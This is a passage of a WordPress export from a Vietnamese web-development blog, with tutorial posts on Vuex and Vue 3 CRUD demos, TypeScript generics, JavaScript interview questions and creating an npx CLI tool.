            store.dispatch('decrement', { amount: n })
        }

        // Render lần đầu
        $('#txtCount').innerText = store.getters.countFix(3);

        //5. Subscribe state khi state thay đổi
        store.subscribe((mutation, state) => {
            //console.log(mutation, state);
            $('#txtCount').innerText = store.getters.countFix(3);
        })

    </script>
</body>

</html>
</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1631</wp:post_id>
		<wp:post_date><![CDATA[2021-10-01 01:00:56]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-09-30 18:00:56]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2022-08-07 00:50:48]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2022-08-07 00:50:48]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[vuejs-count-1-vuex-without-component]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="vuejs-v2"><![CDATA[VueJS-v2]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title><![CDATA[VueJS3 - Count: 2. Vuex is so simple]]></title>
		<link>https://duycode.com/2021/10/01/vuejs-count-2-vuex-is-so-simple/</link>
		<pubDate>Thu, 30 Sep 2021 19:00:20 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=1640</guid>
		<description></description>
		<content:encoded><![CDATA[<pre>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Vuex for Vue</title>
</head>

<body>
    <div id="app">
        <input type="number" v-model.number="amount">
        <button v-on:click="increment">Increment</button>
        <button v-on:click="decrement">Decrement</button>
        <p>{{count}}</p>
    </div>

    <script src="https://unpkg.com/vue@3.2.19/dist/vue.global.js"></script>
    <script src="https://unpkg.com/vuex@4.0.2/dist/vuex.global.js"></script>

    <script>
        //A. Tạo store Vuex
        const store = Vuex.createStore({
            //3. State là kho chứa dữ liệu
            state() {
                return {
                    count: 0,
                }
            },
            //1. Action nhận dispatch, xử lý payload rồi commit mutations
            actions: {
                increment(context, payload) {
                    context.commit('increment', payload);
                },
                decrement(context, payload) {
                    context.commit('decrement', payload);
                }
            },

            //2. Chỉ có thể thay đổi giá trị của State tại mutations
            mutations: {
                increment(state, payload) {
                    state.count += payload.amount;
                },
                decrement(state, payload) {
                    state.count -= payload.amount;
                },
            },

            //4. Getters có thể nhận 1 biến, hoặc 1 function đều được
            getters: {
                countFix: state => custom => {
                    return state.count.toFixed(custom)
                }
            }
        })

        //B. Tạo Root Component
        const RootComponent = {
            data() {
                return { amount: 1 }
            },
            methods: {
                increment() {
                    //Dispatch 1 action trên store với payload {amount}
                    this.$store.dispatch('increment', { amount: this.amount })
                },
                decrement() {
                    this.$store.dispatch('decrement', { amount: this.amount })
                }
            },
            computed: {
                count() {
                    return this.$store.getters.countFix(3);
                }
            }
        }

        const app = Vue.createApp(RootComponent).use(store).mount("#app")
    </script>
</body>

</html>
</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1640</wp:post_id>
		<wp:post_date><![CDATA[2021-10-01 02:00:20]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-09-30 19:00:20]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2022-08-07 00:50:27]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2022-08-07 00:50:27]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[vuejs-count-2-vuex-is-so-simple]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="vuejs-v2"><![CDATA[VueJS-v2]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title><![CDATA[VueJS3 - CRUD: 1. StudentList in one Component]]></title>
		<link>https://duycode.com/2021/10/02/vuejs-crud-1-studentlist-in-one-component/</link>
		<pubDate>Fri, 01 Oct 2021 18:00:34 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=1646</guid>
		<description></description>
		<content:encoded><![CDATA[<pre>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Vue: Basic CRUD</title>
    <style>
        table {
            border-collapse: collapse;
        }

        th,
        td {
            padding: 0 0.5rem;
            border: 1px solid black;
        }
    </style>
</head>

<body>
    <div id="app">
        <button v-on:click="student={ username: '', email: '', id: '' }">New Student</button><br />
        <input type="text" placeholder="username" v-model="student.username" /><br />
        <input type="text" placeholder="email" v-model="student.email" /><br />
        <button @click="saveStudent">{{student.id ? 'Update Student':'Create Student'}}</button><br /><br />
        <input type="text" placeholder="Search..." v-model="filter">
        <button @click="filter=''">x</button>
        <table>
            <thead>
                <tr>
                    <th>#</th>
                    <th>User</th>
                    <th>Email</th>
                    <th>Actions</th>
                </tr>
            </thead>
            <tbody>
                <tr v-for="(item, index) in filterStudent" :key="index">
                    <td>{{index + 1}}</td>
                    <td>{{item.username}}</td>
                    <td>{{item.email}}</td>
                    <td>
                        <button @click="editStudent(item.id)">Edit</button>
                        <button @click="deleteStudent(item.id)">Delete</button>
                    </td>
                </tr>
            </tbody>
        </table>
    </div>

    <script src="https://unpkg.com/vue@3.2.19/dist/vue.global.js"></script>

    <script>
        class Uuid {
            s4() {
                return Math.floor((1 + Math.random()) * 0x10000)
                    .toString(16)
                    .substring(1);
            }
            s16() {
                return this.s4() + this.s4() + this.s4() + this.s4();
            }
        }
        const uuid = new Uuid();

        const RootComponent = {
            data() {
                return {
                    listStudent: [],
                    student: { username: '', email: '', id: '' },
                    filter: "",
                }
            },
            methods: {
                saveStudent() {
                    if (!this.student.id) {
                        this.student.id = uuid.s16();
                        this.listStudent.push({ ...this.student })
                    } else {
                        let find_student = this.listStudent.find(item => item.id == this.student.id);
                        find_student.username = this.student.username;
                        find_student.email = this.student.email;
                    }
                    this.student = { username: '', email: '', id: '' }
                },
                editStudent(id) {
                    let find_student = this.listStudent.find(item => item.id == id);
                    this.student = { ...find_student };
                },
                deleteStudent(id) {
                    this.listStudent = this.listStudent.filter(item => item.id !== id)
                }
            },
            computed: {
                filterStudent() {
                    return this.listStudent.filter(item => item.username.includes(this.filter))
                }
            }
        }

        Vue.createApp(RootComponent).mount("#app")
    </script>
</body>

</html>
</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1646</wp:post_id>
		<wp:post_date><![CDATA[2021-10-02 01:00:34]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-10-01 18:00:34]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2022-08-07 00:50:14]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2022-08-07 00:50:14]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[vuejs-crud-1-studentlist-in-one-component]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="vuejs-v2"><![CDATA[VueJS-v2]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title><![CDATA[VueJS3 - CRUD: 2. StudentList in multiple Component]]></title>
		<link>https://duycode.com/2021/10/02/vuejs-crud-2-studentlist-in-multiple-component/</link>
		<pubDate>Fri, 01 Oct 2021 19:00:56 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=1650</guid>
		<description></description>
		<content:encoded><![CDATA[<pre>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Vue: Basic CRUD</title>
    <style>
        table {
            border-collapse: collapse;
        }

        th,
        td {
            padding: 0 0.5rem;
            border: 1px solid black;
        }
    </style>
</head>

<body>
    <div id="app"></div>

    <script src="https://unpkg.com/vue@3.2.19/dist/vue.global.js"></script>

    <script>
        class Uuid {
            s4() {
                return Math.floor((1 + Math.random()) * 0x10000)
                    .toString(16)
                    .substring(1);
            }
            s16() {
                return this.s4() + this.s4() + this.s4() + this.s4();
            }
        }
        const uuid = new Uuid();

        const ComponentA = {
            props: {
                props_saveStudent: {
                    type: Function,
                },
                student: Object,
            },
            template: `<div>
                        <button v-on:click="$emit('sendStudent',{ username:'',email:'',id:''})">
                            New Student
                        </button><br />
                        <input type="text" placeholder="username" v-model="student.username" /><br />
                        <input type="text" placeholder="email" v-model="student.email" /><br />
                        <button @click="saveStudent">{{student.id ? 'Update Student':'Create Student'}}
                        </button><br /><br />
                    </div>`,
            methods: {
                saveStudent() {
                    if (!this.student.username || !this.student.email) return;
                    this.props_saveStudent(this.student);
                }
            },
        }
        const ComponentB = {
            data() {
                return { filter: "", }
            },
            props: {
                props_listStudent: Array,
                props_deleteStudent: Function,
            },
            template: `<div>
                        <input type="text" placeholder="Search..." v-model="filter">
                        <button @click="filter=''">x</button>
                        <table>
                            <thead>
                                <tr>
                                    <th>#</th>
                                    <th>User</th>
                                    <th>Email</th>
                                    <th>Actions</th>
                                </tr>
                            </thead>
                            <tbody>
                                <tr v-for="(item, index) in filterStudent" :key="index">
                                    <td>{{index + 1}}</td>
                                    <td>{{item.username}}</td>
                                    <td>{{item.email}}</td>
                                    <td>
                                        <button @click="$emit('sendStudent', {...item})">Edit</button>
                                        <button @click="props_deleteStudent(item.id)">Delete</button>
                                    </td>
                                </tr>
                            </tbody>
                        </table>
                    </div>`,
            computed: {
                filterStudent() {
                    return this.props_listStudent.filter(item => item.username.includes(this.filter))
                }
            },
        }

        const RootComponent = {
            template: `<component-a 
                            :student = "student"
                            :props_saveStudent="saveStudent" 
                            @sendStudent="student=$event"
                        />
                    <component-b 
                        :props_listStudent="listStudent"
                        :props_deleteStudent="deleteStudent"
                        @sendStudent="student=$event"
                    />`,

            data() {
                return {
                    student: { username: '', email: '', id: '' },
                    listStudent: [{ username: 'name1', email: 'email', id: '123123' }],
                    filter: "",
                }
            },

            components: {
                "component-a": ComponentA,
                "component-b": ComponentB
            },
            methods: {
                saveStudent(student) {
                    if (!student.id) {
                        student.id = uuid.s16();
                        this.listStudent.push({ ...student })
                    } else {
                        let find_student = this.listStudent.find(item => item.id == this.student.id);
                        find_student.username = this.student.username;
                        find_student.email = this.student.email;
                    }
                    this.student = { username: '', email: '', id: '' };
                },
                deleteStudent(id) {
                    this.listStudent = this.listStudent.filter(item => item.id !== id)
                },
            },
        }

        Vue.createApp(RootComponent).mount("#app")
    </script>
</body>

</html>
</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1650</wp:post_id>
		<wp:post_date><![CDATA[2021-10-02 02:00:56]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-10-01 19:00:56]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2022-08-07 00:50:06]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2022-08-07 00:50:06]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[vuejs-crud-2-studentlist-in-multiple-component]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="vuejs-v2"><![CDATA[VueJS-v2]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title><![CDATA[Các thư viện Online quan trọng]]></title>
		<link>https://duycode.com/2021/08/03/cac-thu-vien-online-quan-trong/</link>
		<pubDate>Tue, 03 Aug 2021 06:09:03 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=1679</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>1. Fake Data</h2>
Các thư viện fake thường dùng: <a href="https://github.com/Marak/faker.js" rel="noopener" target="_blank">https://github.com/Marak/faker.js</a> 
<h3>1.2. Fake API</h3>
<a href="https://reqres.in/" rel="noopener" target="_blank">https://reqres.in/</a>
<a href="https://fakestoreapi.com/" rel="noopener" target="_blank">https://fakestoreapi.com/</a>
<a href="https://mockapi.io/" rel="noopener" target="_blank">https://mockapi.io/</a>
<a href="https://jsonplaceholder.typicode.com/" rel="noopener" target="_blank">https://jsonplaceholder.typicode.com/</a>

<h3>1.3. Fake Image</h3>
<a href="https://picsum.photos/" rel="noopener" target="_blank">https://picsum.photos/</a>
<a href="https://loremflickr.com/" rel="noopener" target="_blank">https://loremflickr.com/</a>


<h2>Host server</h2>
1. Github Page
2. Firebase
3. Vercel
<a href="https://vercel.com/" rel="noopener" target="_blank">https://vercel.com/</a>
- Publich web lên vercel bằng đúng 1 dòng lệnh
<blockquote>npx now --public</blockquote>
4. Surge.sh
<a href="https://surge.sh/" rel="noopener" target="_blank">https://surge.sh/</a>
5. Netlify
6. Heroku
7. Ngrok

<h2>3. Đưa local host lên server</h2>
- ngrok
- localtunnel]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1679</wp:post_id>
		<wp:post_date><![CDATA[2021-08-03 13:09:03]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-08-03 06:09:03]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2021-08-03 13:09:03]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2021-08-03 06:09:03]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[cac-thu-vien-online-quan-trong]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="mang-may-tinh"><![CDATA[Mạng Máy Tính]]></category>
						</item>
					<item>
		<title><![CDATA[Typescripts căn bản]]></title>
		<link>https://duycode.com/2021/08/09/typescripts-can-ban/</link>
		<pubDate>Mon, 09 Aug 2021 02:41:17 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=1712</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>1 số cú pháp cần nhớ</h2>
Union type | string | number;
Intersection Types &
Optional notation ?
Angle brackets: <>
Nullish coalescing operator: ??
Generic type
Decorators: @

<h2>Cài đặt</h2>
<blockquote>
npm i -g typescript
npx tsc --init
</blockquote>
<pre>
let myname = "Harry"

//Genenric
const gener_1 = <T>(arr: Array<T>) => arr[0];
const gener_2 = <X, Y>(x: X, y: Y) => [x, y];
const gener_3 = <X, Y>(x: X, y: Y): [X, Y] => [x, y];
const gener_4 = <X, Y = number>(x: X, y: Y): [X, Y] => [x, y];

const run_gener_1 = gener_1([1, 2, 3]);
const run_gener_2 = gener_2(123, "abc");
const run_gener_3 = gener_3(123, "abc");
const run_gener_31 = gener_3<number | boolean, string>(123, "abc");
const run_gener_4 = gener_4<string | null>("abc", 123);

//Generic Extends 
const gener_5 = (obj: { firstName: string; lastName: string }) => ({
    ...obj,
    fullname: `${obj.firstName} ${obj.lastName}`
})
const gener_6 = <T extends { firstName: string; lastName: string }>(obj: T) => ({
    ...obj,
    fullname: `${obj.firstName} ${obj.lastName}`
})
const gener_7_error = (employee: object) => ({
    ...employee,
    uid: Math.floor(Math.random() * 100),
})
const gener_8_fix = <T>(employee: T) => ({
    ...employee,
    uid: Math.floor(Math.random() * 100),
})
const run_gener_5 = gener_5({ firstName: "John", lastName: "Parker" });
const run_gener_6 = gener_6({ firstName: "John", lastName: "Parker", age: 30 });
const run_gener_7 = gener_7_error({ firstName: "John", lastName: "Parker", age: 30 });
const run_gener_8 = gener_8_fix({ firstName: "John", lastName: "Parker", age: 30 });


//Generic Interface
interface Resource<T> {
    uid: number,
    name: string,
    data: T,
}

type NumberResource = Resource<number[]>

const res1: Resource<object> = {
    uid: 1,
    name: "Jack",
    data: { order: 2 }
}
const res2: Resource<string[]> = {
    uid: 1,
    name: "Jack",
    data: ["John", "Jack"]
}
const res3: NumberResource = {
    uid: 1,
    name: "Jack",
    data: [12, 34]
}

</pre>
]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1712</wp:post_id>
		<wp:post_date><![CDATA[2021-08-09 09:41:17]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-08-09 02:41:17]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2022-07-01 10:58:22]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2022-07-01 03:58:22]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[typescripts-can-ban]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="javascript"><![CDATA[Javascript]]></category>
						</item>
					<item>
		<title><![CDATA[Câu hỏi Javascript]]></title>
		<link>https://duycode.com/2021/08/10/cau-hoi-javascript/</link>
		<pubDate>Tue, 10 Aug 2021 12:30:04 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=1716</guid>
		<description></description>
		<content:encoded><![CDATA[<h3>Câu 1. Phân biệt var, let, const và Phân loại scope ?</h3>
Có 3 loại scope:
- Block scope - xuất hiện từ ES6
- Function scope 
- Global scope

<table>
<tbody>
<tr>
<td>&nbsp;</td>
<td>var</td>
<td>let</td>
<td>const</td>
</tr>
<tr>
<td>Xuất hiện</td>
<td>Trước ES6</td>
<td>Từ ES6</td>
<td>Từ ES6</td>
</tr>
<tr>
<td>Khai b&aacute;o lại</td>
<td>c&oacute;</td>
<td>kh&ocirc;ng</td>
<td>kh&ocirc;ng</td>
</tr>
<tr>
<td>Tham chiếu gi&aacute; trị kh&aacute;c</td>
<td>c&oacute;</td>
<td>c&oacute;</td>
<td>kh&ocirc;ng</td>
</tr>
<tr>
<td><strong>Hoisting</strong></td>
<td>c&oacute;</td>
<td>kh&ocirc;ng</td>
<td>kh&ocirc;ng</td>
</tr>
<tr>
<td><strong>Scope</strong></td>
<td>function scope</td>
<td>block scope</td>
<td>block scope</td>
</tr>
</tbody>
</table>

<h3>Câu 2. Các kiểu dữ liệu trong JS. Phân biệt các giá trị falsy</h3>
1. Có 6 kiểu dữ liệu (Data Types) nguyên thủy (primitives): undefined, Boolean, Number, BigInt, String, Symbol
2. Có 2 kiểu cấu trúc (Structural Types): Object, Function
3. Cấu trúc gốc nguyên thủy (Structural Root Primitive): null (typeof null = "object")

<strong>Phân biệt các giá trị falsy</strong>
1. Các giá trị falsy là các giá trị khi phủ định được trả về kết quả "true"
<p>C&aacute;c gi&aacute; trị falsy</p>
<table>
<tbody>
<tr>
<td>&nbsp;</td>
<td>typeof</td>
<td>&Yacute; nghĩa</td>
<td>So s&aacute;nh</td>
</tr>
<tr>
<td>undefined</td>
<td>
<p>'undefined'</p>
</td>
<td>Chưa được khai b&aacute;o, hoặc đ&atilde; khai b&aacute;o nhưng chưa g&aacute;n gi&aacute; trị</td>
<td rowspan="6">
<p>-&nbsp;NaN kh&aacute;c mọi thứ: NaN == NaN // false,&nbsp; NaN&nbsp;=== NaN&nbsp; &nbsp;//false<br /><br /></p>
<p>-&nbsp;Nh&oacute;m undefined v&agrave; null bằng nhau:&nbsp;null == undefined&nbsp; &nbsp;//true , đương nhi&ecirc;n&nbsp;null === undefined&nbsp; //false</p>
<p><span class="hljs-literal">-&nbsp;Nh&oacute;m c&ograve;n lại bằng nhau: 0 == false == "", đương nhi&ecirc;n so s&aacute;nh === // false<br /><br /></span></p>
<p>&nbsp;</p>
<p>&nbsp;</p>
</td>
</tr>
<tr>
<td>null</td>
<td>"object"</td>
<td>G&aacute;n gi&aacute; trị null</td>
</tr>
<tr>
<td>false</td>
<td>
<p>"boolean"</p>
</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>NaN</td>
<td>
<p>"number"</p>
</td>
<td>
<p><span class="hljs-literal">Kh&ocirc;ng thể trả về 1 số cụ thể, Vd: 1/"haha"</span></p>
</td>
</tr>
<tr>
<td>0</td>
<td>
<p>"number"</p>
</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>""</td>
<td>
<p>"string"</p>
</td>
<td>&nbsp;</td>
</tr>
</tbody>
</table>
<p>Một số gi&aacute; trị trusthy đặc biệt:&nbsp;[], {},&nbsp;Infinity (khi 1 ph&eacute;p chia cho 0)</p>
<p>Đặc biệt hơn</p>
<p>0 == [] // true&nbsp; -----&gt; [] vẫn l&agrave; trusthy nh&eacute; :V</p>
<p>0 == {} // false</p>


<h3>Câu 3: Những tính năng mới trong ES6</h3>
1. let và const. 
2. template strings
3. Object
- destructuring, rest: VD: {destructurin, ...rest} = obj
- spread: ...[array]
- Literals object (khai báo rút gọn)
- class
4. Function
- default parameter
- arrow functions
- promise
- function generator: yield
5. module es6: export, import

<h3>Câu 4: Hiểu thế nào về Call stack, event loop, callback, JS engine</h3>
<a href="http://latentflip.com/loupe/" rel="noopener" target="_blank">http://latentflip.com/loupe/</a>
<img src="https://felixgerschau.com/static/79486d91b22a7c1b4044fce88a4cae20/5a190/js-event-loop-explained.png" />
<strong>1. JS Engine và V8 Engine là gì?</strong>
- JS engine là 1 công cụ có khả năng biên dịch và thông dịch JS ra mã máy
- JS engine có 2 thành phần chính: 'Memory Heap' và 'Call Stack'
- AJAX, setTimeout, DOM không nằm trong JS Engine
- V8 engine là một JS Engine có mặt ở 2 công cụ lớn nhất hiện nay: browser (Chrome), nodejs

<strong>2. JS Runtime là gì</strong>
- Browser's JS runtime Enviroment bao gồm: JS Engine + công cụ của Browser cung cấp: WebAPIs, event loop, callback queue (chạy trên 1 thread riêng)
- Node's JS runtime Enviroment bao gồm: JS Engine + + công cụ của NodeJS cung cấp: C++ APIs, event loop và callback được implement bằng C++
- Các bộ cung cấp đó được chạy trên 1 thread riêng và được bảo trợ bỏi concurrency

<strong>3. Event loop là gì</strong>
- Event loop có nhiệm vụ đợi cho Call Stack rỗng, rồi soi xem Callback Queue có gì không, nếu có thì bốc cái đầu tiên bỏ vào CS để chạy

<strong>4. render() là gì</strong>
- Browser không thể gọi render() nếu có code JS cần chạy trong CallStack. Kiểu như tự nó là async callback vậy, phải đợi cho CallStack rỗng mới chạy được.
- Chỉ khác một chút là render() được ưu tiên hơn so với các callback thông thường. 
- Cứ mỗi 16ms (với chỉ số lý tưởng 60fps), một lời gọi render() sẽ được đưa vào hàng đợi và đến khi CS rỗng thì mới được thực thi.
- Nên nếu bạn block CallStack quá lâu thì UI sẽ bị đơ, user chẳng thể click lên button hay edit text được nữa




]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1716</wp:post_id>
		<wp:post_date><![CDATA[2021-08-10 19:30:04]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-08-10 12:30:04]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2022-07-28 04:03:57]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2022-07-28 04:03:57]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[cau-hoi-javascript]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="javascript"><![CDATA[Javascript]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title><![CDATA[NPX - P1. Tạo CLI]]></title>
		<link>https://duycode.com/2021/08/12/npx-p1-tao-cli/</link>
		<pubDate>Thu, 12 Aug 2021 16:30:00 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=1731</guid>
		<description></description>
		<content:encoded><![CDATA[** Chuẩn bị
1. Cài đặt NodeJS: <a href="https://nodejs.org/en/download/" rel="noopener" target="_blank">https://nodejs.org/en/download/</a>
2. Kiểm tra version của NodeJS và NPM, sau đó tạo project
<blockquote>
node -v
npm -v
npm init -y
</blockquote>

<h2>1. Cài đặt ./package.json</h2>
<pre>
{
  "name": "@duycode/create-fakeapi",
  "version": "1.0.0",
  "description": "",
  "main": "index.js",
  "bin": {
    "@duycode/create-fakeapi": "bin/create-fakeapi",
    "create-fakeapi": "bin/create-fakeapi"
  },
  "scripts": {
    "test": "echo \"Error: no test specified\" && exit 1"
  },
  "keywords": [],
  "author": "",
  "license": "ISC"
}
</pre>
Giải thích: 
-- Bắt buộc: "name": tên project phải bắt đầu có chữ "create-*"
-- 2 lệnh "bin" tương ứng
 + "create-fakeapi": câu lệnh CLI tại local (tại chính máy tính của mình)
 + @duycode/create-fakeapi   ==> sau này update lên npmjs thì có 2 cách chạy dòng này: 
<blockquote>
npm init @duycode/fakeapi   
npx @duycode/create-fakeapi
</blockquote>
-- bin/create-fakeapi: chính là nơi thực thi 2 dòng lệnh đó

<h2>2. Cài đặt BIN</h2>
-- Tạo file: ./bin/create-fakeapi (không có đuôi file, nhưng có cú pháp viết của js)
-- Bắt buộc ở đầu file: "#!/usr/bin/env node"
<pre>
#!/usr/bin/env node
console.log('Congratulation ! You are Ready');
</pre>

<h2>3. Đăng ký sử dụng CLI</h2>
-- Tại thư mục project, chạy lệnh sau:
<blockquote>
npm link
</blockquote>
-- CLI đã được đăng ký tại 2 thư mục sau:
C:\Users\duyk3\AppData\Roaming\npm
C:\Users\duyk3\AppData\Roaming\npm\node_modules

<h2>4. Khởi chạy lần đầu</h2>
Dùng CMD tại chính folder của project
<blockquote>
create-fakeapi
</blockquote>
-> Kết quả: 'Congratulation ! You are Ready'

<h2>5. Sử dụng Demo</h2>
-- Tại file: ./bin/create-fakeapi
<pre>
#!/usr/bin/env node
const { execSync } = require('child_process')

const repoName = process.argv[2] || "./"
const gitURL = 'https://github.com/duyk30b/duyk30b.github.io.git';
const gitCloneCommand = `git clone ${gitURL} ${repoName}`;
const installCommand = `cd ${repoName} && npm install`;

try {
    execSync(gitCloneCommand);
    execSync(installCommand);

} catch (error) {
    process.exit(-1);
}
console.log('Congratulation ! You are Ready :D');
</pre>

-- Sử dụng CLI
<blockquote>
create-fakeapi newfolder
</blockquote>
--> kết quả: 1 folder mới đã được tạo ra từ clone github, sau đó đã tự install hoàn toàn mọi thứ :D, hay chưa

<h2>6. Đưa lên npmjs</h2>
-- Thêm vào package.json
<pre>
"publishConfig": {
	"access": "public"
},
</pre>
-- Phblish thôi (nhớ phải login trước khi publish)
<blockquote>npm publish</blockquote>

<h2>7. Sử dụng nâng cao hơn</h2>
Khi cần nhiều options hơn, cần sử dụng thêm những thư viện sau:
1. arg : phân tích biến đầu vào, như -v, --y, -g, --install ==> tạo options hợp lý để xử lý logic
2. inquirer: Tạo bộ câu hỏi khi bắt đầu cài
3. ncp : copy file 
4. execa : tạo các lệnh thực thi ngoài: như: "git init", "git clone .."
